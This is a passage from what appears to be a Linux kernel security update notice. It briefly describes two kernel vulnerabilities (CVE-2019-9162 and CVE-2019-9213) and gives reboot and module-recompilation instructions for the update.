performed insufficient ASN.1 length checks. An attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-9162](/security/CVE-2019-9162))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.
